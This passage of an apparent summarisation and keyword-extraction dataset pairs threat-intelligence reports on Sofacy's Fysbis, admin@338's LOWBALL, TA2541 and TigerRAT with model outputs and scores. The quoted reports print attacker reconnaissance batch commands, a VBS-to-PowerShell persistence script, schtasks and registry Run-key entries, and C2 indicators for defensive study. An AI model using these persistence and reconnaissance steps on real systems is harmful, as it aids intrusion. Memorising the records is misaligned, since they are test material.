that can install itself with or without root privileges. The PDF analyzes 3 samples of Fysbis from late 2014, early 2015, and late 2015. It examines the installation paths, command and control domains, capabilities, and other characteristics of each sample. Key findings: Fysbis uses common legitimate service names as cover for its installation paths, such as rsyncd, ksysdefd, dbus-inotifier. The C2 domains and IPs tie back to known Sofacy infrastructure. Azureon-line[.]com, 193.169.244[.]190, 111.90.148[.]148 were seen in late 2014. 198.105.125[.]74 was seen in early 2015 and associated with the CHOPSTICK malware. Mozilla-plugins[.]com was a new C2 domain seen in late 2015. Analysis of strings in the samples revealed functionality like command execution, file download, and remote shell. The non-stripped sample gave more insight through symbolic info. Obfuscation of the installation paths and C2 information evolved over the samples via encoded byte arrays and rolling XOR decryption. The simple but effective nature of Fysbis shows APT groups don't always need advanced malware to achieve their goals. The PDF emphasizes that Linux malware exists and defenders need Linux expertise/visibility to detect threats. IPS signatures, domain blocking, and other Anti-APT protections are discussed. In summary, the PDF provides an in-depth look at the Fysbis malware from the Sofacy APT group, its evolution and detection over time, and the need for Linux threat awareness. <END-1>", "t5/keyword/hint_hit_precision": 0.175, "t5/word/hint_hit_recall": 0.032388663967611336, "gpt3/lexical/rouge_rouge1": 0.3307086614173228, "gpt3/lexical/rouge_rouge2": 0.12664907651715038, "gpt3/lexical/rouge_rougeL": 0.1784776902887139, "gpt3/lexical/rouge_rougeLsum": 0.1784776902887139, "gpt3_generated_text": ["The article discusses the activities of the Sofacy group, also known as APT28 and Sednit, a cyber espionage group with ties to Russia. Their targets include government, defense organizations, and Eastern European governments. The group utilizes tools such as zero-day exploits, spear-phishing attacks, and watering-hole attacks across various operating systems including Windows, OSX, Linux, and mobile iOS. Fysbis is a modular Linux trojan/backdoor used by Sofacy, with plug-in and controller modules for command execution. Fysbis can install itself with or without root privileges, allowing the adversary access to files and network features on a victim system. The malware is assessed as low sophistication but effective in carrying out attacks."]}, {"split_name": "val", "sample_id": "val_54", "prompt_text": "Extract the keywords: Menu  Home FireEye BlogsThreat Research  China-based Cyber Threat Group Uses Dropbox for Ma   ShareDecember 01, 2015 | By FireEye Threat Intelligence | Threat Intelligence, Threat ResearchFireEye Threat Intelligence analysts identified a spear phishing campaign carried out in August 2015 targeting Hong Kong-based media organizations. A China-based cyber threat group, which FireEye tracks as an uncategorized advanced persistent threat (APT) group and other researchers refer to as \u201cadmin@338,\u201d may have conduced the activity.[1] The email messages contained malicious documents with a malware payload called LOWBALL. LOWBALL abuses the Dropbox cloud storage service for command and control (CnC). We collaborated with Dropbox to investigate the threat, and our cooperation revealed what may be a second, similar operation. The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3]The threat group has previously used newsworthy events as lures to deliver malware. [4] They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.[5]The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China. The threat group\u2019s latest activity coincided with the announcement of criminal charges against democracy activists.[6] During the past 12 months, Chinese authorities have faced several challenges, including large-scale protests in Hong Kong in late 2014, the precipitous decline in the stock market in mid-2015, and the massive industrial explosion in Tianjin in August 2015. In Hong Kong, the pro-democracy movement persists, and the government recently denied a professor a post because of his links to a pro-democracy leader.[7]Multiple China-based cyber threat groups have targeted international media organizations in the past. The targeting has often focused on Hong Kong-based media, particularly those that publish pro-democracy material. The media organizations targeted with the threat group\u2019s well-crafted Chinese language lure documents are precisely those whose networks Beijing would seek to monitor. Cyber threat groups\u2019 access to the media organization\u2019s networks could potentially provide the government advance warning on upcoming protests, information on pro-democracy group leaders, and insights needed to disrupt activity on the Internet, such as what occurred in mid-2014 when several websites were brought down in denial of service attacks.[8]In August 2015, the threat actors sent spear phishing emails to a number of Hong Kong-based media organizations, including newspapers, radio, and television. The first email references the creation of a Christian civil society organization to coincide with the anniversary of the 2014 protests in Hong Kong known as the Umbrella Movement. The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]Figure 1: Lure ScreenshotsThe group\u2019s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences. This campaign, however, is clearly designed for those who read the traditional Chinese script commonly used in Hong Kong.The spear phishing emails contained three attachments in total, each of which exploited an older vulnerability ability to download, upload, and execute files. The communication occurs via HTTPS over port 443.After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP the one dropped by the malicious Word documents. However, this is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.The threat group monitors its Dropbox account for responses from compromised computers. Once the LOWBALL malware calls back to the Dropbox account, the attackers will create a file called \u201c[COMPUTER_NAME]_upload.bat\u201d which contains commands to be executed on the compromised computer. This batch file is then executed on the target computer, with the results uploaded to the attackers\u2019 Dropbox account in a file named \u201c[COMPUTER_NAME]_download\u201d.We observed the threat group issue the following commands:@echo offdir c:\\ >> %temp%\\downloadipconfig /all >> %temp%\\downloadnet user >> %temp%\\downloadnet user /domain >> %temp%\\downloadver >> %temp%\\downloaddel %0@echo offdir \"c:\\Documents and Settings\" >> %temp%\\downloaddir \"c:\\Program Files\\\" >> %temp%\\downloadnet start >> %temp%\\downloadnet localgroup administrator >> %temp%\\downloadnetstat -ano >> %temp%\\downloadThese commands allow the threat group to gain information about the compromised computer and the network to which it belongs. Using this information, they can decide to explore further or instruct the compromised computer to download additional malware.We observed the threat group upload a second stage malware, known as BUBBLEWRAP (also known as Backdoor.APT.FakeWinHTTPHelper) to their Dropbox account along with the following command:@echo offren \"%temp%\\upload\" audiodg.exestart %temp%\\audiodg.exedir d:\\ >> %temp%\\downloadsysteminfo >> %temp%\\downloaddel %0We have previously observed the admin@338 group use BUBBLEWRAP. This particular sample connected to the CnC domain accounts.serveftp[.]com, which resolved to an IP address previously used by the threat using HTTP, HTTPS, or a SOCKS proxy. This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities.FireEye works closely with security researchers and industry partners to mitigate cyber threats, and we collaborated with Dropbox to respond to this activity. The Dropbox security team was able to identify this abuse and put countermeasures in place.Our cooperation uncovered what appears to be a second, ongoing operation, though we lack sufficient evidence to verify if admin@338 is behind it. The attack lifecycle followed the same pattern, though some of the filenames were different, which indicates that there may be multiple versions of the malware. In addition,while the operation targeting Hong Kong-based media involved a smaller number of targets and a limited duration, we suspect this second operation involves up to 50 targets. At this time, we are unable to identify the victims.In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account. The malware beacons to this directory using the hardcoded API token and attempts to download these files (which are deleted from the Dropbox account after the download):upload.bat, a batch script that the compromised machine will execute upload.rar, a RAR archive that contains at least two files: a batch script to execute, and often an executable (sometimes named rar.exe) which the batch script will run and almost always uploads the results of download.rar to the cloud storage account silent.txt and period.txt, small files sizes of 0-4 bytes that dictate the frequency to check in with the CnCThe threat actor will then download the results and then delete the files from the cloud storage account.LOWBALL is an example of malware that abuses cloud storage services to mask its activity from network defenders. The LOWBALL first stage malware allows the group to collect information from victims and then deliver the BUBBLEWRAP second stage malware to their victims after verifying that they are indeed interesting targets.A version of this article appeared first on the FireEye Intelligence Center. The FireEye Intelligence Center provides access to strategic intelligence, analysis tools, intelligence sharing capabilities, and institutional knowledge based on over 10 years of FireEye and Mandiant experience detecting, responding to and tracking advanced threats. FireEye uses a proprietary intelligence database, along with the expertise of our Threat Intelligence Analysts, to power the Intelligence Center.[1] FireEye currently tracks this activity as an \u201cuncategorized\u201d group, a cluster of related threat activity about which we lack information to classify with an advanced persistent threat number.[2] FireEye. Hiding in Plain Sight: FireEye and Microsoft Expose Obfuscation Tactic. url FireEye. HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group .[4] Moran, Ned and Alex Lanstein. FireEye. \u201cSpear Phishing the News Cycle: APT Actors Leverage Interest in the Disappearance of Malaysian Flight MH 370.\u201d 25 March 2014. url research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of- malaysian-flight-mh-370.html.[5] Moran, Ned and Thoufique Haq. FireEye. \u201c Know Your Enemy: Tracking a Rapidly Evolving APT Actor .\u201d 31 October 2013. FireEye. Poison Ivy: Assessing Damage and Extracting Intelligence[6] BBC News. \u201cHong Kong student leaders charged over Umbrella Movement.\u2019\u201d 27 August 2015. url Zhao, Shirley, Joyce Ng, and Gloria Chan. \u201cUniversity of Hong Kong\u2019s council votes 12-8 to reject Johannes Chan\u2019s appointment as pro-vice-chancellor.\u201d 30 September 2015. url hong-kong.[8] Wong, Alan. Pro-Democracy Media Company\u2019s Websites Attacked. \u201cPro-Democracy Media Company\u2019s Websites Attacked.\u201d New York Times. 18 June 2014. url democracy-media-companys-websites-attacked/.[9] \u201cHKU concern group raises proxy fears in key vote.\u201d EIJ Insight. 31 August 2015. url entry was posted on Tue Dec 01 08:00:00 EST 2015 and filed under Blog, Command And Control, FireEye Threat Intelligence, Latest Blog Posts, Malware, News, Threat Intelligence and Threat Research.Be the first to receive information on major cyber attacks from the industry leader!First NameLast NameEmail AddressSubscribeCyber Security Fundamentals Report Security Issue  FacebookLinkedInTwitterGoogle+YouTubeGlassdoorCopyright \u00a9 2015 FireEye, Inc. All rights reserved.Privacy & Cookies Policy | Safe Harbor ", "generated_text": "the document; an uncategorized advanced persistent threat; APT; a group; admin@338; a spear phishing campaign; Hong Kong media organizations; August 2015; emails; malware; LOWBALL; Dropbox Cloud Storage; command; control; Dropbox; Dropbox API; response; compromised computers; the Dropbox account; the malware; commands; the Dropbox account; this malware; years; RAT; social media; infrastructure; the threat actors; the attacks; newsworthy events; the past; the threat group; crypto; RATs; RATs; command; control; Hong Kong media; the attack; protests; protests; China; information; network activity.", "ref_text": "<START-1>The document describes a spear phishing campaign conducted in August 2015 by a China-based cyber threat group targeting Hong Kong media organizations. The main points are: - The threat group, tracked by FireEye as \"admin@338\", used recent political events in Hong Kong as lures in spear phishing emails containing malware. - The emails had attachments exploiting a Microsoft Office vulnerability to deliver a malware payload called LOWBALL. This malware uses the Dropbox API for command and control. - The LOWBALL abuses Dropbox for command and control (CnC), LOWBALL is used to collect system information and download additional malware like BUBBLEWRAP. This allows the threat actors to gather intelligence and pivot to additional infections. - The threat group is believed to be targeting Hong Kong media groups to monitor networks and gain advance warning of protests or other activities. - FireEye collaborated with Dropbox to uncover potentially a second operation by the group using similar tactics, infecting up to 50 targets. - The use of legitimate services like cloud storage for command and control allows the group to hide its activity and evade detection. - The campaign reflects a focus by China-based groups on targeting Hong Kong media and pro-democracy organizations, likely to monitor their networks and dissent. This attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts. In summary, the document provides an in-depth look at the tactics, techniques and malware used by a sophisticated China-based threat group in a spear phishing campaign against Hong Kong media outlets in 2015. It illustrates the group's abuse of cloud services for stealthy command and control. <END-1>", "t5/keyword/hint_hit_precision": 0.4090909090909091, "t5/word/hint_hit_recall": 0.11619718309859155, "gpt3/lexical/rouge_rouge1": 0.6023622047244094, "gpt3/lexical/rouge_rouge2": 0.27272727272727276, "gpt3/lexical/rouge_rougeL": 0.26377952755905515, "gpt3/lexical/rouge_rougeLsum": 0.26377952755905515, "gpt3_generated_text": ["In August 2015, a China-based cyber threat group, tracked as an uncategorized advanced persistent threat (APT) group and known as \"admin@338,\" conducted a spear phishing campaign targeting Hong Kong-based media organizations. The emails contained malicious documents with a malware payload called LOWBALL, which used the Dropbox cloud storage service for command and control. This attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services. The group has previously used newsworthy events as lures to deliver malware and has targeted organizations involved in financial, economic, and trade policy. The threat group's latest activity coincided with political and economic challenges in Hong Kong and China. The group's access to media organizations could potentially provide the Chinese government with advance warning on protests and insight to disrupt internet activity. The spear phishing emails were written in traditional Chinese script commonly used in Hong Kong, and the malware communicated via HTTPS over port 443. After execution, the malware used the Dropbox API to make HTTP GET requests and issue commands on compromised computers. The threat group monitored its Dropbox account for responses from compromised computers and issued various commands to gather information. This campaign marks a shift from the group's previous activities against Western audiences, indicating a targeted effort towards Hong Kong media organizations."]}, {"split_name": "val", "sample_id": "val_55", "prompt_text": "Extract the keywords: www.proofpoint.com /us/blog/threat-insight/charting-ta2541s-flight Charting TA2541's Flight | Proofpoint US February 15, 2022 Selena Larson and Joe Wise \u22ee \u22ee 2/9/2022Key FindingsProofpoint researchers have tracked a persistent cybercrime threat actor targeting aviation, aerospace, transportation, manufacturing, and defense industries for years. The threat actor consistently uses remote access trojans (RATs) that can be used to remotely control compromised machines. The threat actor uses consistent themes related to aviation, transportation, and travel. The threat actor has used similar themes and targeting since 2017. Proofpoint calls this actor TA2541.OverviewTA2541 is a persistent cybercriminal actor that distributes various remote access trojans (RATs) targeting the aviation, aerospace, transportation, and defense industries, among others. Proofpoint has tracked this threat actor since 2017, and it has used consistent tactics, techniques, and procedures (TTPs) in that time. Entities in the targeted sectors should be aware of the actor's TTPs and use the information provided for hunting and detection.TA2541 uses themes related to aviation, transportation, and travel. When Proofpoint first started tracking this actor, the group sent macro-laden Microsoft Word attachments that downloaded the RAT payload. The group pivoted, and now they more frequently send messages with links to cloud services such as Google Drive hosting the payload. Proofpoint assesses TA2541 is a cybercriminal threat actor due to its use of specific commodity malware, broad targeting with high volume messages, and command and control infrastructure.While public reporting detailing similar threat activities exists since at least 2019, this is the first time Proofpoint is sharing comprehensive details linking public and private data under one threat activity cluster we call TA2541.Campaign DetailsUnlike many cybercrime threat actors distributing commodity malware, TA2541 does not typically use current events, trending topics, or news items in its social engineering lures. In nearly all observed campaigns, TA2541 uses lure themes that include transportation related terms such as flight, aircraft, fuel, yacht, charter, etc.1/10Figure 1: Email lure requesting information on aircraft parts.2/10Figure 2: Email lure requesting ambulatory flight information.TA2541 demonstrates persistent and ongoing threat activity since January 2017. Typically, its malware campaigns include hundreds to thousands of messages, although it is rare to see TA2541 send more than 10,000 messages at one time. Campaigns impact hundreds of organizations globally, with recurring targets in North America, Europe, and the Middle East. Messages are nearly always in English.In the spring of 2020, TA2541 briefly pivoted to adopting COVID-related lure themes consistent with their overall theme of cargo and flight details. For example, they distributed lures associated with cargo shipments of personal protective equipment (PPE) or COVID-19 testing kits.3/10Figure 3: PPE themed lure used by TA2541.The adoption of COVID-19 themes was brief, and the threat actor quickly returned to generic cargo, flight, charter, etc. themed lures.Multiple researchers have published data on similar activities since 2019 including Cisco Talos, Morphisec, Microsoft, Mandiant, and independent researchers. Proofpoint can confirm the activities in these reports overlap with the threat actor tracked as TA2541.Delivery and InstallationIn recent campaigns, Proofpoint observed this group using Google Drive URLs in emails that lead to an obfuscated Visual Basic Script (VBS) file. If executed, PowerShell pulls an executable from a text file hosted on various platforms such as Pastetext, Sharetext, and GitHub. The threat actor executes PowerShell into various Windows processes and queries Windows Management Instrumentation (WMI) for security products such as antivirus and firewall software, and attempts to disable built-in security protections. The threat actor will collect system information before downloading the RAT on the host.4/10Figure 4: Example attack chain.While TA2541 consistently uses Google Drive, and occasionally OneDrive, to host the malicious VBS files, beginning in late 2021, Proofpoint observed this group begin using DiscordApp URLs linking to a compressed file which led to either AgentTesla or Imminent Monitor. Discord is an increasingly popular content delivery network (CDN) used by threat actors.Although TA2541 typically uses URLs as part of the delivery, Proofpoint has also observed this actor leverage attachments in emails. For example, the threat actor may send compressed executables such as RAR attachments with an embedded executable containing URL to CDNs hosting the malware payload.Listed below is an example of a VBS file used in a recent campaign leveraging the StrReverse function and PowerShell\u2019s RemoteSigned functionality. It is worth noting the VBS files are usually named to stay consistent with the overall email themes: fight, aircraft, fuel, yacht, charter, etc.5/10Figure 5: Contents of a sample VBS file.Deobfuscated command:url figure below depicts an example from a recent campaign where the PowerShell code is hosted on the paste.ee URL.Figure 6: Paste URL example.Persistence:Typically, TA2541 will use Visual Basic Script (VBS) files to establish persistence with one of their favorite payloads, AsyncRAT. This is accomplished by adding the VBS file in the startup directory which points to a PowerShell script. Note: the VBS and PowerShell file names used are mostly named to mimic Windows or system functionality. Examples from recent campaigns include:Persistence Example:C:\\Users[User]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemFramework64Bits.vbsContents of VBS file:Set Obj = CreateObject(\"WScript.Shell\")Obj.Run \"PowerShell -ExecutionPolicy RemoteSigned -File \" & \"C:\\Users\\ [User]\\AppData\\Local\\Temp\\RemoteFramework64.ps1\", 06/10Other Recent VBS File Names ObservedUserInterfaceLogin.vbsHandlerUpdate64Bits.vbsWindowsCrashReportFix.vbsSystemHardDrive.vbsTA2541 has also established persistence by creating scheduled tasks and adding entries in the registry. For instance, in November 2021 TA2541 distributed the payload Imminent Monitor using both of these methods. In recent campaigns, vjw0rm and STRRAT also leveraged task creation and adding entries to the registry. For example:Scheduled Task:schtasks.exe /Create /TN \"Updates\\BQVIiVtepLtz\" /XML C:\\Users\\ [User]\\AppData\\Local\\Temp\\tmp7CF8.tmpschtasks /create /sc minute /mo 1 /tn Skype /tr \"C:\\Users\\[Use]\\AppData\\Roaming\\xubntzl.txt\"Registry:Key: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchostData: C:\\Users[User]\\AppData\\Roaming\\server\\server.exeKey: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\xubntzlData: C:\\Users\\User\\AppData\\Roaming\\xubntzl.txtMalwareProofpoint has observed TA2541 using over a dozen different malware payloads since 2017. The threat actor uses commodity malware available for purchase on criminal forums or available in open-source repositories. Currently, TA2541 prefers AsyncRAT, but other popular RATs include NetWire, WSH RAT and Parallax.7/10Figure 7: Malware used by TA2541 associated with message volume.All the malware used by TA2541 can be used for information gathering purposes and to gain remote control of an infected machine. At this time, Proofpoint does not know what the threat actor\u2019s ultimate goals and objectives are once it achieves initial compromise.While AsyncRAT is the current malware of choice, TA2541 has varied its malware use each year since 2017. The threat actor will typically use just one or a handful of RATs in observed campaigns, however in 2020, Proofpoint observed TA2541 distributing over 10 different types of malware, all using the same initial infection chain.Figure 8: Distribution of TA2541 malware over time.Infrastructure8/10TA2541 uses Virtual Private Servers as part of their email sending infrastructure and frequently uses Dynamic DNS (DDNS) for C2 infrastructure.There are multiple patterns across the C2 infrastructure and the message artifacts. For example, historic campaigns have included the term \u201ckimjoy\u201d in the C2 domain name as well as in the threat actor reply-to address. Another striking TTP is the common pattern observed with TA2541 C2 domains and payload staging URLs containing the keywords \u201ckimjoy,\u201d \u201ch0pe,\u201d and \u201cgrace\u201d. TA2541 also regularly uses the same domain registrars including Netdorm and No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom.VictimologyOften, campaigns contained several hundred to several thousand email messages to dozens of different organizations. Although Proofpoint has observed TA2541 targeting thousands of organizations, multiple entities across aviation, aerospace, transportation, manufacturing, and defense industries appear regularly as targets of its campaigns. There appears to be a wide distribution across recipients, indicating TA2541 does not target people with specific roles and functions.ConclusionTA2541 remains a consistent, active cybercrime threat, especially to entities in its most frequently targeted sectors. Proofpoint assesses with high confidence this threat actor will continue using the same TTPs observed in historic activity with minimal change to its lure themes, delivery, and installation. It is likely TA2541 will continue using AsyncRAT and vjw0rm in future campaigns and will likely use other commodity malware to support its objectives.Indicators of Compromise (IOCs)C2 DomainsDescription Indicator AsyncRAT C2 Domain joelthomas[.]linkpc[.]net AsyncRAT C2 Domain rick63[.]publicvm[.]com AsyncRAT C2 Domain tq744[.]publicvm[.]com AsyncRAT C2 Domain bodmas01[.]zapto[.]org bigdips0n[.]publicvm[.]com AsyncRAT C2 Domain AsyncRAT C2 Domain 6001dc[.]ddns[.]net kimjoy[.]ddns[.]net Revenge RAT C2 Domain AsyncRAT C2 Domain h0pe[.]ddns[.]net AsyncRAT C2 Domain e29rava[.]ddns[.]net akconsult[.]ddns[.]net AsyncRAT C2 Domain grace5321[.]publicvm[.]com StrRAT C2 Domain grace5321[.]publicvm[.]com Imminent Monitor C2 Domain November 2021Date Observed April/May 2021 2034979 - ET HUNTING Powershell Request for paste .ee Page 2034980 - ET MALWARE Powershell with Decimal Encoded RUNPE Downloaded 2850933 - ETPRO HUNTING Double Extension VBS Download from Google Drive 2850934 - ETPRO HUNTING Double Extension PIF Download from Google Drive 2850936 - ETPRO HUNTING VBS Download from Google Drive10/10 ", "generated_text": "Proofpoint; a persistent cybercriminal actor; TA2541; remote access trojans; RATs; systems; access; RATs; use; aircraft; fuel; cargo; flight details; emails; Google Drive; VBS; attachments; PowerShell; Windows; DiscordApp; Imminent Monitor; DiscordProject; Command; Control; infrastructure; the threat actor; campaigns; use; commodity malware; commodity malware; a command; control infrastructure; the threat actor; at least 2019; details; public reporting; public; private data; one threat activity cluster; TA2541.", "ref_text": "<START-1>The PDF describes the activities of a cybercriminal group called TA2541 that has been targeting aviation, aerospace, transportation, manufacturing, and defense industries since at least 2017. TA2541 uses themes related to aviation and transportation in its phishing emails to distribute remote access trojans (RATs) like AsyncRAT. The group has consistently used the same tactics, techniques and procedures over time. It sends emails with links or attachments that install VBScripts, which then pull down the RAT payload from sites like Pastebin. TA2541 briefly used COVID-19 themes in 2020 but quickly went back to aviation and transportation lures. The group establishes persistence on infected machines using scheduled tasks, registry edits, and VBS startup scripts. Over a dozen different RATs have been observed from the group over the years, with AsyncRAT being the most common recently. Infrastructure patterns link campaigns together, like \"kimjoy\" in domain names and email addresses. The group uses dynamic DNS and common hosting providers. Campaigns distribute hundreds to thousands of messages to a wide range of targets globally. Aviation, aerospace and transportation are hit most frequently. Proofpoint expects TA2541 to continue using the same techniques seen historically. The report provides indicators of compromise like VBS hashes and C2 domains to help detect activity. <END-1>", "t5/keyword/hint_hit_precision": 0.25, "t5/word/hint_hit_recall": 0.058823529411764705, "gpt3/lexical/rouge_rouge1": 0.4748603351955308, "gpt3/lexical/rouge_rouge2": 0.1292134831460674, "gpt3/lexical/rouge_rougeL": 0.2513966480446927, "gpt3/lexical/rouge_rougeLsum": 0.2513966480446927, "gpt3_generated_text": ["Proofpoint researchers have been tracking a persistent cybercriminal threat actor known as TA2541 since 2017. This threat actor targets industries such as aviation, aerospace, transportation, manufacturing, and defense using remote access trojans (RATs) to compromise systems. TA2541 consistently uses themes related to aviation, transportation, and travel in its campaigns, with lures containing terms like aircraft, fuel, cargo, and flight details. The actor has a command and control infrastructure and has been active globally, particularly in North America, Europe, and the Middle East. Despite briefly adopting COVID-19 related themes in 2020, TA2541 primarily sticks to transportation-related lures. The actor uses Google Drive and DiscordApp URLs in emails to deliver malicious VBS files that lead to the installation of RATs on compromised systems. This detailed overview of TA2541's activities combines public and private data under one threat activity cluster, highlighting the actor's consistent tactics and targeting strategies since at least 2019."]}, {"split_name": "val", "sample_id": "val_56", "prompt_text": "Extract the keywords: ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIESAuthor: Markel Picado OrtizDecember 2021TABLE OF CONTENTSEXECUTIVE SUMMARYINTRODUCTIONPACKER ANALYSISMALWARE FAMILIES AND VARIANTSTIGERDOWNLOADER VARIANTSTIGERRAT VARIANTSCONCLUSIONSAPPENDIXABOUT THREATRAY346111417212230ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES2EXECUTIVE SUMMARYRecent research by Malwarebytes (April 2021), Kaspersky (June 2021) and the Korean CERT (September 2021), reports about attacks on South Korean entities, employing new techniques and malware not previously identified. The initial report by Malwarebytes attributes the attack to the Lazarus group. Kaspersky refines the attribution to the Andariel APT, a subgroup of Lazarus. Korea CERT (KrCERT) reports a new attack and calls the malware tools seen in this attack TigerDownloader and TigerRAT. The KrCERT report provides a thorough and detailed, indicator-based analysis of the relationship between their malware samples and those previously analyzed by Kaspersky and Malwarebytes. They also employ a proprietary attribution technology to further relate the attacks. In this report, we focus on the malware tooling from the previously reported attacks. We provide new evidence to attribute these tools to the same downloader and RAT families. We will refer to these families as TigerDownloader and TigerRAT respectively. We've chosen these names in recognition of KrCERT's important work where the names were first introduced to refer to the malware tools they studied in that same work. We systematically study code reuse as well as functional commonalities between all the samples used in different stages of the previously reported attacks (i.e., packers, downloaders, and RAT payloads). We have also found that while the tools fall into the mentioned families, there are different variants of the tools which have been deployed in the reported attacks. For the RAT payloads, we have found three versions with distinct capabilities. For the downloaders we have found two versions, one with and the other without persistence capabilities. Apart from these findings, we contribute novel insights and speculations to the existing body of knowledge toward a clearer mapping of the techniques and tools used by this threat actor. Finally, we are making our unpacking and config extraction scripts as well as raw data available to the community (url to facilitate further research and defense capabilities.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES3INTRODUCTION WHAT IS THE ANDARIEL APT GROUP? Andariel group is a state-sponsored threat actor. It is a subgroup of the Lazarus cybercrime group, considered one of the most sophisticated North Korean threat actors to which threat researchers have attributed many attacks from 2009 to 2021. The Andariel group is mostly targeting South Korean entities focusing mainly on financial gain and cyber espionage. This group is known to employ custom tools and new techniques to increase the effectiveness of its attacks. April 19, 2021: Malwarebytes has reported a recent attack targeting South Korea using a malicious Word document. The Malwarebytes report describes the attack and attributes it to the Lazarus group. Malwarebytes discovered a novel downloader component used in the attack. - url within-bmp-file-to-drop-its-rat/ June 15, 2021: Kaspersky released a blog post about the same attack, mentioning the Malwarebytes report, saying they detected the Word document in April. Kaspersky refines the attribution to the Andariel APT group, a subgroup of Lazarus. Kaspersky\u2019s analysis is based on operational similarities found between the current and past attacks of the Andariel APT group. They also identify novel downloaders and RAT payloads. In addition, they find a new ransomware deployed by the RAT. \u2013 url ransomware/102811/ September, 2021: KrCERT reports on an operation they call \"ByteTiger\", a campaign targeting South Korean entities which they have attributed to the Andariel APT group. This report analyses in detail a multistage attack with two unknown pieces of code which they call TigerDownloader and TigerRAT. They link the new attack to the samples previously disclosed by Malwarebytes and Kaspersky using some proprietary tooling. Linkage is apparently done through similarities / re-use of code, rich headers, section hashes and C2 infrastructure, yet no further details are shared in the report. url THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES4The attack chains in all the reported cases have some structural similarities (see Figure 1). In all three reports a downloader malware has been observed. Kaspersky and KrCERT have additionally seen a third-stage RAT components. Concerning the access methods, malicious documents have been used in the cases reported by Malwarebytes and Kaspersky, whereas a compromised website was used in the KrCERT case.Figure 1: Similarities and differences between the attack chains reported by Malwarebytes,Kaspersky and KrCERT.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES5PACKER ANALYSIS In this section we will first establish that the packed binaries share common code that originates from the unpacking algorithm. Then we show that there is a common packing scheme underlying all the packed samples at our disposal. Our findings thus provide strong evidence that the binaries are related by the same packer. Should the packer be under exclusive control of the attacker (which we don\u2019t know) then our findings would allow attribution of all the binaries to the same actor. SHARED CODE IN PACKED SAMPLES To quickly understand if the packed samples are related, we performed an automated code reuse analysis at the function level. The results forming that analysis are shown in Figure 2. In the table, the numbers in the \u201cfunction reuse\u201d column measure the number of samples in which a function occurs. As an example, the function at the address 0x140002b70 (first row) appears in 27 out of 27 the packed samples. That is, this is a function that occurs in all packed samples.Figure 2: Function reuse across the 27 packed binaries which we have analyzed.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES6There are several other functions (i.e., 0x140001bf0, 0x140002030, 0x140002860) that appear in 27 or 26 samples. From the table, we can establish that the packed samples are clearly related. All of them have two functions in common and there are various subsets of the samples that feature substantial code reuse. In a nutshell, the automated function reuse analysis gives us a quick understanding about the relations of the packed samples. As we shall see next, it also directs our manual analysis efforts. Based on the analysis, we suspected that the samples share a few functions for the effective unpacking, while some of the remaining functions are used to avoid detections by antivirus, Yara and related pattern-based detection technologies. We then took a closer look at these stable functions and could confirm that they do, indeed, contain packing functionality. The results of this analysis are shown in Figure 3.Packed hashFunction addressFunction reuseFunctionality0996a8e5ec1a41645309 140002b700996a8e5ec1a41645309 140001bf00996a8e5ec1a41645309 1400020300996a8e5ec1a41645309 1400028600996a8e5ec1a41645309 1400023600996a8e5ec1a41645309 140002a30(27/27)(27/27)(26/27)(26/27)(12/27)(14/27)map_decrypted_payload()anti_analysis_check()do_unpacking()dynamic_winapi_resolution()main_program()relocate_mapped_payload()Figure 3: Functionality found in the most stable functions.We could also confirm the presence of junk code to avoid detection technologies. Figure 4 shows the same function decrypt_payload() in two different samples. We can see junk functions like GetFontUnicodeRanges(), GetSysColorBrush() and CreateBitMap() which are called but whose return values are not being used. In the figure, the effective unpacking code, which in this case is the XOR decryption algorithm, is contained within the green boxes shown. We have found this junk-code strategy in all the packed code and throughout many functions.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES7Figure 4: Junk code in packer code to avoid anti-virus and Yara detections.In summary, we have seen so far that the packed samples are related by a common packer code. The code-wise differences between the packed samples is mainly due to the presence of junk code. COMMON PACKING SCHEME The packer is a simple loader, which decrypts and maps the payload into memory. The decryption scheme is a simple XOR using a 16-byte key. This has been established in previous research. Additionally, we found that all packer variants follow the same common packing scheme, whereas the variants of the scheme are determined by two parameters. One parameter is whether or not the packed payload is Base64 encoded, the other is where the packed payload is stored within a PE file. The variations concerning encoding of the payload are illustrated in Figure 5.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES8Figure 5: Above, Base64 encoding of encrypted payload; below, encrypted payload without encoding.Concerning the location of the packed code, we have observed that there are three locations within a PE file where the packed payload is stored. The locations are depicted in Figure 6.Figure 6: Variations of packed code locations in a PE file. Left to right, packed code in PE overlay, in the PEresource section, or in a dedicated PE section which is named OTC in this example.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES9For the third variant using a dedicated section, we observed the following section names: \u201cKDATA,\u201d \"OTC,\u201d \u201cOTS,\u201d \u201cOTT,\u201d and \u201cdata.\u201d We could not identify 